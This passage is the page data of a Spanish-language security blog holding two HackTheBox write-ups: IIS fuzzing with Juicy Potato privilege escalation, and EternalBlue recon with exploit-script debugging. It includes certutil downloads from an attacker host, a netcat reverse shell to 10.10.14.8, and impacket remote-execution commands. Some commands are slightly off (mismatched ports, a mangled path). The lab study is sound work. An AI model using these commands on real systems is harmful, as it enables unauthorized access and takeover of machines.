{"componentChunkName":"component---node-modules-gatsby-theme-portfolio-minimal-src-templates-article-listing-index-tsx","path":"/blog/","result":{"pageContext":{"articles":[{"banner":{"alt":"Really close pic of one eye","caption":"Photo by <a href=\"https://unsplash.com/@v2osk\">v2osk</a> on Unsplash","src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/jpeg;base64,/9j/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAAMABQDASIAAhEBAxEB/8QAGAAAAgMAAAAAAAAAAAAAAAAAAAcECAn/xAAVAQEBAAAAAAAAAAAAAAAAAAAFBv/aAAwDAQACEAMQAAABoOxEhpJMNOIkFQF//8QAGRABAAMBAQAAAAAAAAAAAAAABAIFBgMH/9oACAEBAAEFAlC5W22JqYZjQFw9PeHIvsn0XOkIlU9VaEh//8QAIhEAAgEDBAIDAAAAAAAAAAAAAQIDERITAAQFIhRxITKB/9oACAEDAQE/AfLePkOSWVmaUZprqI6GJC2SMBgrozU+wY9bRRbRp95yF7493MiXGxM0nVa/C/g9ehr/xAAgEQACAgEDBQAAAAAAAAAAAAABAgMREgAEEyIxMnGB/9oACAECAQE/Ad6grZSMuUDtFGEV5IpFnlCcMhZSyOkd3jgCGs210NuIzBEXijZuNcm406jQs+J7+z91/8QAJRAAAgEDAwQCAwAAAAAAAAAAAQIDBBESAAUhFCIjMxMxFUFR/9oACAEBAAY/At7NcYrbVLSUFJEyeBU+FOePXkXzEuDLkfrVBsk23DceuaPzPTQSBkq5GjgRosF6lFY+UwqCALhy19RV9XssIqHXCTpKSkiiJjJF8Sb3t/bduItxqT5SD+Shgeq/WTrBGAy89rdg5+9KZ6aCR4FkeGV4kaaFosADFMwMsdwxyCMAdU0UIplTpo29THuYtc+zX//EABwQAQEBAQACAwAAAAAAAAAAAAERIQAxQVFhcf/aAAgBAQABPyExTX/FzKxOUjEo5oVgl+tsE6SdierpGE2gYYIwdMNHA/QBAU3HnlG5JSnDDBkIBOqWhFTRF+IH4Huvf//aAAwDAQACAAMAAAAQfM//xAAXEQEBAQEAAAAAAAAAAAAAAAABEQAx/9oACAEDAQE/EJQYkU9bCgDekMUh5g5LJoNAoBjAYf/EABcRAQEBAQAAAAAAAAAAAAAAAAERIQD/2gAIAQIBAT8QQICZWajAnGPcbT6osdRTTdTdUK//xAAYEAEBAQEBAAAAAAAAAAAAAAABEQAhMf/aAAgBAQABPxCyzoDRbso5g+BsbYejpnEEkYdcJmOtyi5lK4uBdJKBVKCdwq6qXrVp+PZYDsdmEn4U1Y/D1Wj/2Q=="},"images":{"fallback":{"src":"/static/e128430a92a84af91cb7b674d9245937/91671/eye.jpg","srcSet":"/static/e128430a92a84af91cb7b674d9245937/7e3b4/eye.jpg 165w,\n/static/e128430a92a84af91cb7b674d9245937/47f88/eye.jpg 330w,\n/static/e128430a92a84af91cb7b674d9245937/91671/eye.jpg 660w,\n/static/e128430a92a84af91cb7b674d9245937/5aaff/eye.jpg 1320w","sizes":"(min-width: 660px) 660px, 100vw"},"sources":[{"srcSet":"/static/e128430a92a84af91cb7b674d9245937/322ad/eye.webp 165w,\n/static/e128430a92a84af91cb7b674d9245937/de3b3/eye.webp 330w,\n/static/e128430a92a84af91cb7b674d9245937/2b2b5/eye.webp 660w,\n/static/e128430a92a84af91cb7b674d9245937/e36a7/eye.webp 1320w","type":"image/webp","sizes":"(min-width: 660px) 660px, 100vw"}]},"width":660,"height":400}}}},"body":"<h1>Que aprendi de la maquina Bounty</h1>\n<p>En esta maquina podemos ver varias cosas muy comunes y que a la vez me frustran muchisimo cuando las olvido:</p>\n<ol>\n<li>Rabbit Holes</li>\n<li>Fuzzing de archivos</li>\n</ol>\n<p>Tambien aprendemos fragilidades del IIS, como ser el <code class=\"language-text\">web.config</code> y subidas de archivos que permitan la extension <code class=\"language-text\">.config</code>.</p>\n<p>It is very similar to a .htaccess file in Apache web server. Uploading a .htaccess file to bypass protections around the uploaded files is a known technique.</p>\n<h2>Mal Fuzzing</h2>\n<h3><code class=\"language-text\">archivo.ext</code></h3>\n<p>Fuzzear mal provoca problemas como perder de vista vias de explotacion, perder tiempo, nos anula la entrada potencial a la victima, y nos provoca un falso negativo, es decir que creemos que no existe modo de aproximacion posible, cuando en realidad no aplicamos bien el concepto de Fuzzear.</p>\n<p>No ser detallista a la hora de considerar el OS victima y no hacer una investigacion rapida sobre los archivos que utiliza el sistema segun el lenguaje que usa el sistema, y sumado a una completa subestimacion de la importancia de fuzzear <code class=\"language-text\">archivo.ext</code> durante el testeo, me condujeron a un falso negativo.</p>\n<h3>wordlist incorrecta</h3>\n<p>Otras de las cosas que me gusta subestimar es la propia wordlist. Si bien hay muchas wordlists, hacer una pequenia busqueda de wordlists empezando por su propio nombre puede ser la diferencia entre resolver una maquina o no.</p>\n<p>Hay listas genericas para servidores, como la lista con la <code class=\"language-text\">common.txt</code> que descubre el folder del IIS <code class=\"language-text\">uploadedfiles</code>. La lista <code class=\"language-text\">raft-large-extensions-lowercase.txt</code> con la que descubrimos las extensiones, y aqui vemos tambien la importancia de esforzarnos minimamente en elegir nuestra lista de fuzzeo por algunos detalles que menciono a continuacion.</p>\n<h4>wordlist-blabla-lowercase.txt</h4>\n<p>Si buscamos fuzzear extensiones pero no buscamos validar si el servidor interpreta la misma extension de un modo distinto si es Mayus/Minus, la wordlist <code class=\"language-text\">web-extensions-big.txt</code> no es la indicada, por mas que tenga 66885 lineas y eso nos de una sensacion de infalibilidad.</p>\n<p>Entonces, vemos que <em>\"lowercase\"</em> significa eso, que no habra variantes Mayus/Minus de la misma extension, y si bien puede que no esten todas, puede tambien que esten las suficientes.</p>\n<p>Si analizamos desde esta optica, vemos que no hay muchas que sean lower case (minusculas), en realidad solo hay dos, y si queremos apuntar a una mayor covertura, eso nos deja solo una:</p>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">└─$ <span class=\"token function\">locate</span> /usr/share/wordlists/SecLists *.txt <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> extension <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> lower  \n/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-extensions-lowercase.txt\n/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-extensions-lowercase.txt\n/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-extensions-lowercase.txt\n/usr/share/wordlists/SecLists/Fuzzing/file-extensions-lower-case.txt\n\n└─$ <span class=\"token function\">cat</span> /usr/share/wordlists/SecLists/Fuzzing/file-extensions-lower-case.txt <span class=\"token operator\">|</span> <span class=\"token function\">wc</span> <span class=\"token parameter variable\">-l</span>      \n<span class=\"token number\">769</span>\n\n└─$ <span class=\"token function\">cat</span> /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-extensions-lowercase.txt <span class=\"token operator\">|</span> <span class=\"token function\">wc</span> <span class=\"token parameter variable\">-l</span>\n<span class=\"token number\">2367</span></code></pre></div>\n<blockquote>\n<p>Las listas mencionadas se encuentran en <code class=\"language-text\">SecLists/Discovery/Web-Content/</code></p>\n</blockquote>\n<h3>Fuzzing mal aplicado</h3>\n<p>Si bien podriamos pensar que fuzzear con wffuz <code class=\"language-text\">archivo.ext</code> para buscar vias potenciales de explotacion de un servidor seria una via valida de reconocimiento, si el archivo de extensiones es muy grande se vuelve ineficiente. Y por el tiempo que llevaria llegar a un archivo.ext util quiza cancelemos el proceso antes de llegar a el.</p>\n<p>Por ello, seria mejor no pasar por alto el OS del servidor, y fuzzear archivos con una pequenia lista de extensiones basada en el lenguaje que usa su sistema. El comando que podriamos usar para ello seria el siguiente:</p>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">wfuzz <span class=\"token parameter variable\">-u</span> http://target.vict/FUZZ.FUZ2Z <span class=\"token parameter variable\">-w</span> wordlist.txt <span class=\"token parameter variable\">-z</span> list,asp-aspx <span class=\"token parameter variable\">--hc</span> <span class=\"token number\">404</span> </code></pre></div>\n<h2>Escalation of Privilege with Juicy Potato + Netcat for reverse shell</h2>\n<h3>Dangerous Privileges</h3>\n<div class=\"gatsby-highlight\" data-language=\"ps\"><pre class=\"language-ps\"><code class=\"language-ps\">whoami /priv</code></pre></div>\n<ol>\n<li>SeImpersonatePrivilege\n<ol>\n<li>Juicy Potato\n<ol>\n<li>Alternativas\n<ol>\n<li>(En algunos no funcionara, pero hay un modo alternativo con PIPES - pipeserverimpoersonate) (quiza sea el Windows Server 2019)</li>\n</ol>\n</li>\n<li>Fallos\n<ol>\n<li>Por default Juicy Potato utiliza un CLSID, pero si falla se pueden utilzar otros segun sea la version del sistema (systeminfo)</li>\n</ol>\n</li>\n<li>Versiones\n<ol>\n<li>Windows 2008 es vulnerable al EternalBlue, se podria subir chisel para para hacer un port forwarding exponiendo el puerto 445 y atacarlo</li>\n</ol>\n</li>\n</ol>\n</li>\n</ol>\n</li>\n</ol>\n<h3>How-to attack</h3>\n<ol>\n<li>Download Juicy Potato (fresh potatoes > JuicyPotato.exe)\n<ol>\n<li><a href=\"https://ohpe.github.io/juicy-potato/\">https://ohpe.github.io/juicy-potato/</a></li>\n</ol>\n</li>\n<li>Download Netcat for Windows (v1.12)\n<ol>\n<li><a href=\"https://eternallybored.org/misc/netcat/\">https://eternallybored.org/misc/netcat/</a></li>\n</ol>\n</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\"><span class=\"token function\">unzip</span> netcat.zip <span class=\"token parameter variable\">-d</span> netcat\n<span class=\"token function\">mv</span> netcat/nc64.exe <span class=\"token builtin class-name\">.</span>\n\n<span class=\"token comment\"># verify</span>\n└─$ <span class=\"token function\">ls</span>\nnc64.exe JuicyPotato.exe\n\n<span class=\"token comment\"># Create a Python server to share the files with Windows Victim</span>\n└─$ python <span class=\"token parameter variable\">-m</span> http.server <span class=\"token number\">80</span>\n<span class=\"token comment\"># Create a Netcat listener in the Kali Attacker</span>\n└─$ <span class=\"token function\">nc</span> <span class=\"token parameter variable\">-lvnp</span> <span class=\"token number\">9191</span>\n<span class=\"token comment\"># Request the files from Windows Victim</span>\nPS C:<span class=\"token punctuation\">\\</span>Windows<span class=\"token punctuation\">\\</span>Temp<span class=\"token punctuation\">\\</span>Privesc<span class=\"token operator\">></span> certutil.exe <span class=\"token parameter variable\">-f</span> <span class=\"token parameter variable\">-urlcache</span> <span class=\"token parameter variable\">-split</span> http://10.10.14.8/JuicyPotato.exe JuicyPotato.exe\nPS C:<span class=\"token punctuation\">\\</span>Windows<span class=\"token punctuation\">\\</span>Temp<span class=\"token punctuation\">\\</span>Privesc<span class=\"token operator\">></span> certutil.exe <span class=\"token parameter variable\">-f</span> <span class=\"token parameter variable\">-urlcache</span> <span class=\"token parameter variable\">-split</span> http://10.10.14.8/nc64.exe nc64.exe\n\n<span class=\"token comment\"># verify</span>\nPS C:<span class=\"token punctuation\">\\</span>Windows<span class=\"token punctuation\">\\</span>Temp<span class=\"token punctuation\">\\</span>Privesc<span class=\"token operator\">></span> <span class=\"token function\">dir</span>\nMode                LastWriteTime     Length Name                              \n----                -------------     ------ ----                              \n-a---         <span class=\"token number\">12</span>/2/2025  <span class=\"token number\">11</span>:12 PM     <span class=\"token number\">347648</span> JuicyPotato.exe                   \n-a---         <span class=\"token number\">12</span>/2/2025  <span class=\"token number\">11</span>:12 PM      <span class=\"token number\">45272</span> nc64.exe                          \n\n<span class=\"token comment\"># Reverse Shell</span>\nPS C:<span class=\"token punctuation\">\\</span>Windows<span class=\"token punctuation\">\\</span>Temp<span class=\"token punctuation\">\\</span>Privesc<span class=\"token operator\">></span> .<span class=\"token punctuation\">\\</span>JuicyPotato.exe <span class=\"token parameter variable\">-t</span> * <span class=\"token parameter variable\">-p</span> C:<span class=\"token punctuation\">\\</span>Windows<span class=\"token punctuation\">\\</span>System32<span class=\"token punctuation\">\\</span>cmd.exe <span class=\"token parameter variable\">-l</span> <span class=\"token number\">9191</span> <span class=\"token parameter variable\">-a</span> <span class=\"token string\">\"/c C:\\Windows\\Temp\\Privesc<span class=\"token entity\" title=\"\\n\">\\n</span>c64.exe -e cmd 10.10.14.8 9292\"</span>\n\n<span class=\"token comment\"># the Kali Attacker Netcat listener \"nc -lvnp 9191\"</span>\nC:<span class=\"token punctuation\">\\</span>Windows<span class=\"token punctuation\">\\</span>system3<span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>whoami\nnt authority<span class=\"token punctuation\">\\</span>system</code></pre></div>","categories":["Fuzzing","Web Server","tool","Juicy Potato"],"date":"November 29, 2025","description":"Microsoft-IIS/7.5 & Juicy Potato","id":"af37749c-4fc1-5a59-aa22-50ce007a7940","keywords":["Fuzzing","Web Server","tool","Juicy Potato"],"slug":"/htb-bounty/","title":"Microsoft-IIS/7.5 & Juicy Potato","readingTime":{"text":"4 min read"}},{"banner":{"alt":"Ocean image","caption":"Photo by <a href=\"https://unsplash.com/@tarafuco\">Tanja Cotoaga</a> on Unsplash","src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/jpeg;base64,/9j/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAAMABQDASIAAhEBAxEB/8QAGAAAAwEBAAAAAAAAAAAAAAAAAAYKCAn/xAAVAQEBAAAAAAAAAAAAAAAAAAAHBv/aAAwDAQACEAMQAAABV9P8BmGiFKVydYPk3//EABsQAAICAwEAAAAAAAAAAAAAAAMEBQYAAQIW/9oACAEBAAEFAom+VTIm9U7FL9W+QJsGKUTjPTPqZQG//8QAIREAAgICAQQDAAAAAAAAAAAAAQIDBBEhBQAGEhMUMTL/2gAIAQMBAT8B42i3BTMYaHbsrYRy54OhDIB7EwokrVoS2M68tD7GD1X7ssCCIfBrDEajCTWI1GAPyit4qujhRoDXX//EACMRAAICAQMDBQAAAAAAAAAAAAECAxEFBCIxAAYSExUhMkH/2gAIAQIBAT8ByE7ZQenJr85F4RM9LltZKlUR9Z55Pmuaq+Ca6n7VdppG9zm3OW3xaeRtxBHk7xFnajuZrJN8/v8A/8QAKBAAAgEDAQYHAQAAAAAAAAAAAQIDBBESABNBUVJhgQUUITEycZHC/9oACAEBAAY/AkE/gVOoO+Spmf8AgHSYUdCjBT8XfPZ9XZQ/3w0gjpolTcI53C9sI7d/3QLyHlt7ADppk2zgKFKlWsym1/Q6aJvLVOBxEtTBnNiAAAzq0eduZ7vxa1gP/8QAGhABAQEBAQEBAAAAAAAAAAAAAREhMQBBUf/aAAgBAQABPyGJgQQWEY/Z3974Tioy8YK36qAQh2PnX8xuh1G1bmh88jsCUDg4+T7ih2IdGnegsTxwl6mXfMsBrEHp/9oADAMBAAIAAwAAABDE7//EABcRAQEBAQAAAAAAAAAAAAAAAAERIQD/2gAIAQMBAT8QgDw5pFyRg1pgCciYQIoYLCigZ3//xAAYEQEBAQEBAAAAAAAAAAAAAAABESEAQf/aAAgBAgEBPxBztRNTZAevDLCiiWEqTBYjRSLS8//EABgQAQEBAQEAAAAAAAAAAAAAAAERIQAx/9oACAEBAAE/EF2FjZQT0hSyEFMJYsCpKY9YC4VTj5tILYox6FaAIZ/GiEDGDAVPZPKcCbpGUXTAGyFAhBxnbQHBUfLrz//Z"},"images":{"fallback":{"src":"/static/c2bcd907622a9040da92b03a17b9f733/91671/eternal-blue.jpg","srcSet":"/static/c2bcd907622a9040da92b03a17b9f733/7e3b4/eternal-blue.jpg 165w,\n/static/c2bcd907622a9040da92b03a17b9f733/47f88/eternal-blue.jpg 330w,\n/static/c2bcd907622a9040da92b03a17b9f733/91671/eternal-blue.jpg 660w,\n/static/c2bcd907622a9040da92b03a17b9f733/5aaff/eternal-blue.jpg 1320w","sizes":"(min-width: 660px) 660px, 100vw"},"sources":[{"srcSet":"/static/c2bcd907622a9040da92b03a17b9f733/322ad/eternal-blue.webp 165w,\n/static/c2bcd907622a9040da92b03a17b9f733/de3b3/eternal-blue.webp 330w,\n/static/c2bcd907622a9040da92b03a17b9f733/2b2b5/eternal-blue.webp 660w,\n/static/c2bcd907622a9040da92b03a17b9f733/e36a7/eternal-blue.webp 1320w","type":"image/webp","sizes":"(min-width: 660px) 660px, 100vw"}]},"width":660,"height":400}}}},"body":"<h1>Que aprendi de la maquina Blue</h1>\n<h2>Nmap default scripts are not vuln</h2>\n<p>Nmap utiliza default scripts, esto significa que no descubrira vectores vulnerables como EternalBlue con el flag -sCV.</p>\n<p>Para descubrir vectores conocidos con Nmap podemos scanear por categoria de scripts:</p>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">└─$ nmap <span class=\"token parameter variable\">-sS</span> <span class=\"token parameter variable\">--script</span> <span class=\"token string\">\"vuln,auth\"</span> <span class=\"token parameter variable\">-vv</span> <span class=\"token parameter variable\">--open</span> <span class=\"token parameter variable\">-p</span> <span class=\"token number\">135,139</span>,445,49152,49153,49154,49155,49156,49157 <span class=\"token parameter variable\">-Pn</span> <span class=\"token parameter variable\">-n</span> <span class=\"token number\">10.10</span>.10.40 <span class=\"token parameter variable\">-oN</span> vuln.ports</code></pre></div>\n<p>De este modo vemos resultados para EternalBlue con los scripts de la categoria vuln de Nmap.</p>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\"><span class=\"token operator\">|</span> smb-vuln-ms17-010: \n<span class=\"token operator\">|</span>   VULNERABLE:\n<span class=\"token operator\">|</span>   Remote Code Execution vulnerability <span class=\"token keyword\">in</span> Microsoft SMBv1 servers <span class=\"token punctuation\">(</span>ms17-010<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>     State: VULNERABLE\n<span class=\"token operator\">|</span>     IDs:  CVE:CVE-2017-0143\n<span class=\"token operator\">|</span>     Risk factor: HIGH</code></pre></div>\n<h2>EternalBlue</h2>\n<p>Una idea recurrente en seguridad es reconocer vectores, patrones o versiones vulnerables, de ahi que veamos los resultados de Nmap default y pensemos en probar si el Host es vulnerable a EternalBlue.</p>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">Host script results:\n<span class=\"token operator\">|</span> smb-os-discovery: \n<span class=\"token operator\">|</span>   OS: Windows <span class=\"token number\">7</span> Professional <span class=\"token number\">7601</span> Service Pack <span class=\"token number\">1</span> <span class=\"token punctuation\">(</span>Windows <span class=\"token number\">7</span> Professional <span class=\"token number\">6.1</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional\n<span class=\"token operator\">|</span>   Computer name: haris-PC</code></pre></div>\n<p>Otra traza que nos puede ayudar a advertir EternalBlue es la version 1 de SMB, que podemos obtener con el script <code class=\"language-text\">smb-protocols</code>:</p>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\"><span class=\"token operator\">|</span> smb-protocols: \n<span class=\"token operator\">|</span>   dialects: \n<span class=\"token operator\">|</span>     NT LM <span class=\"token number\">0.12</span> <span class=\"token punctuation\">(</span>SMBv1<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>dangerous, but default<span class=\"token punctuation\">]</span>\n<span class=\"token operator\">|</span>     <span class=\"token number\">2</span>:0:2\n<span class=\"token operator\">|</span>_    <span class=\"token number\">2</span>:1:0</code></pre></div>\n<h3>Windows 7 Professional Service Pack 1</h3>\n<p>Si el sistema es Windows 7 Professional SP1 es candidato para MS17-010 (EternalBlue) que afecta justamente a SMBv1 en Windows 7/2008R2 y similares.</p>\n<p>Condiciones que te tienen que disparar la alerta “¿MS17-010?”</p>\n<ol>\n<li>Puerto 445/TCP abierto (SMB).</li>\n<li>Sistema operativo en el rango vulnerable:\n<ol>\n<li>Windows 7 (sobre todo SP1).</li>\n<li>Windows Server 2008 / 2008 R2.</li>\n<li>(En entornos más viejos, también XP/2003).</li>\n</ol>\n</li>\n<li>Indicios de SMBv1 habilitado (muy típico en esos sistemas antiguos).</li>\n</ol>\n<p>Un mini-playbook para cualquier objetivo que huela a Windows 7 con SMB:</p>\n<ol>\n<li>Escaneo de puertos: ¿está 445 abierto?</li>\n<li>smb_version o smb-os-discovery: ¿Windows 7 / 2008 R2?</li>\n<li>smb-vuln-ms17-010 o smb_ms17_010: ¿reporta vulnerable?</li>\n</ol>\n<h2>SMB</h2>\n<p>SMB es uno de los vectores de RCE más explotados de Windows en la historia. Si ves SMB en una máquina vieja, piensa que SMB nunca es un puerto “pasivo”:</p>\n<ol>\n<li>¿Es MS17-010?</li>\n<li>¿Es MS08-067?</li>\n<li>¿Hay null session?</li>\n<li>¿Hay shares writeables?</li>\n<li>¿SMBv1 activo?</li>\n</ol>\n<h2>RPC (Remote Procedure Call)</h2>\n<p>RPC es el medio por el cual Windows permite que otras máquinas o procesos remotos llamen a funciones internas del sistema operativo (sobre puertos como 135, 49152–49157 y pipes especiales (IPC$))</p>\n<p><strong>RPC es mucho más que “información”, puede lograr RCE real (exploits RPC)</strong></p>\n<p>Ejemplos reales:</p>\n<ol>\n<li>PrintNightmare (RPC sobre Spooler)</li>\n<li>ZeroLogon (RPC sobre Netlogon/DCERPC)</li>\n<li>PetitPotam (RPC MS-EFSR)</li>\n<li>MS08-067 (RPC sobre SMB)</li>\n<li>DFSCoerce / PrinterBug / etc.</li>\n</ol>\n<h3>Validaciones con rpcclient</h3>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">rpcclient <span class=\"token parameter variable\">-U</span> <span class=\"token string\">\"\"</span> <span class=\"token parameter variable\">-N</span> <span class=\"token operator\">&lt;</span>IP<span class=\"token operator\">></span>\nenumdomusers\nenumdomgroups\nqueryuser <span class=\"token number\">500</span>\nspoolss_enum_printers\neventlog_open Application\neventlog_read <span class=\"token number\">1</span>\nlsaquery\nlookupnames Administrator\nquerydispinfo</code></pre></div>\n<h3>Scripts de Impacket</h3>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">impacket-lookupsid <span class=\"token string\">''</span>@<span class=\"token operator\">&lt;</span>IP<span class=\"token operator\">></span>\nimpacket-samrdump <span class=\"token operator\">&lt;</span>IP<span class=\"token operator\">></span>\nimpacket-rpcdump @<span class=\"token operator\">&lt;</span>IP<span class=\"token operator\">></span>\nimpacket-atexec user:pass@<span class=\"token operator\">&lt;</span>IP<span class=\"token operator\">></span> <span class=\"token string\">\"cmd /c whoami\"</span>\nimpacket-coercer <span class=\"token parameter variable\">-t</span> <span class=\"token operator\">&lt;</span>IP<span class=\"token operator\">></span> <span class=\"token parameter variable\">-p</span> spoolss</code></pre></div>\n<h2>Versiones Compatibles</h2>\n<p>Tanto por Python 2 y Python 3 el script provoca errores, antes de modificar grueso probamos movernos a Python 2 con \"virtualenv\".</p>\n<h3>f-strings sin soporte</h3>\n<p>En este caso, la ultima version de impacket necesaria para ejecutar el script no soporta que impacket utilice f-string sobre Python 2. Basicamente, impacket ha dejado sin soporte Python 2 y crashea.</p>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\"><span class=\"token comment\"># f-strings sin soporte</span>\nTraceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span>:\n    av_pairs<span class=\"token punctuation\">[</span>NTLMSSP_AV_TARGET_NAME<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> f<span class=\"token string\">\"{service}/\"</span>.encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-16le'</span><span class=\"token punctuation\">)</span> + av_pairs<span class=\"token punctuation\">[</span>NTLMSSP_AV_DNS_HOSTNAME<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n                                                   ^\nSyntaxError: invalid syntax</code></pre></div>\n<p>Para resolverlo debemos movernos a una version de impacket que soporte Python 2.</p>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">pip <span class=\"token function\">install</span> <span class=\"token assign-left variable\">impacket</span><span class=\"token operator\">==</span><span class=\"token number\">0.9</span>.21</code></pre></div>\n<h3>can't concat str to byte</h3>\n<p>En Python 3 todo debe ser bytes para operar payloads binarios.\nAl concatenar bytes con una string se produce un error de normalizacion, pack() devuelve bytes, pero <code class=\"language-text\">'A'*0xffde</code> es una string.</p>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span>:\n  File <span class=\"token string\">\"/home/b45lk/audit/study/OSCP/week01/blue_audit/exploits/EternalBlue.py\"</span>, line <span class=\"token number\">83</span>, <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span>\n    ntfea10000 <span class=\"token operator\">=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;BBH'</span>, <span class=\"token number\">0</span>, <span class=\"token number\">0</span>, 0xffdd<span class=\"token punctuation\">)</span> + <span class=\"token string\">'A'</span>*0xffde\n                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~^~~~~~~~~~~~\nTypeError: can't concat str to bytes</code></pre></div>\n<p>Para resolverlo convertimos la string en formato bytes con prefijo <code class=\"language-text\">b'A'</code> o con encode <code class=\"language-text\">('A' * 0xffde).encode()</code></p>\n<div class=\"gatsby-highlight\" data-language=\"py\"><pre class=\"language-py\"><code class=\"language-py\">ntfea10000 <span class=\"token operator\">=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;BBH'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xffdd</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'A'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0xffde</span>\nntfea10000 <span class=\"token operator\">=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;BBH'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xffdd</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'A'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0xffde</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<h2>'ascii' codec can't decode byte 0xa4</h2>\n<p>Una vez mas, Python 2 falla al manejar bytes y strings. En este caso, analizamos la linea en conflicto:</p>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\"><span class=\"token comment\"># El choclisimo de la misma vida nos lleva a la linea que falla (exagere un poco, este error no es tan largo)</span>\nTraceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span>:\n  File <span class=\"token string\">\"zzz_exploit.py\"</span>, line <span class=\"token number\">1113</span>, <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span>\n  File <span class=\"token string\">\"zzz_exploit.py\"</span>, line <span class=\"token number\">1110</span>, <span class=\"token keyword\">in</span> main\n  File <span class=\"token string\">\"zzz_exploit.py\"</span>, line <span class=\"token number\">981</span>, <span class=\"token keyword\">in</span> exploit\n  File <span class=\"token string\">\"zzz_exploit.py\"</span>, line <span class=\"token number\">545</span>, <span class=\"token keyword\">in</span> exploit_matched_pairs\n  File <span class=\"token punctuation\">..</span>. line <span class=\"token number\">401</span>, <span class=\"token keyword\">in</span> send_nt_trans_secondary\n  File <span class=\"token punctuation\">..</span>. line <span class=\"token number\">397</span>, <span class=\"token keyword\">in</span> create_nt_trans_secondary_packet\n  File <span class=\"token punctuation\">..</span>. line <span class=\"token number\">89</span>, <span class=\"token keyword\">in</span> _put_trans_data\n    <span class=\"token comment\"># error:</span>\n    transData <span class=\"token operator\">+=</span> <span class=\"token punctuation\">(</span>b<span class=\"token string\">'\\x00'</span> * padLen<span class=\"token punctuation\">)</span> + str.encode<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\nUnicodeDecodeError: <span class=\"token string\">'ascii'</span> codec can't decode byte 0x91 <span class=\"token keyword\">in</span> position <span class=\"token number\">2</span>: ordinal not <span class=\"token keyword\">in</span> range<span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p>Tomando como experiencia el caso anterior, podemos pensar que el conflicto sucede porque la salida espera bytes pero los datos son strings. Pero si miramos el codigo vemos que aparentemente todo esta bien codificado.</p>\n<p>Haremos unas pruebas:</p>\n<div class=\"gatsby-highlight\" data-language=\"py\"><pre class=\"language-py\"><code class=\"language-py\"><span class=\"token comment\"># ❌ fail: mismo 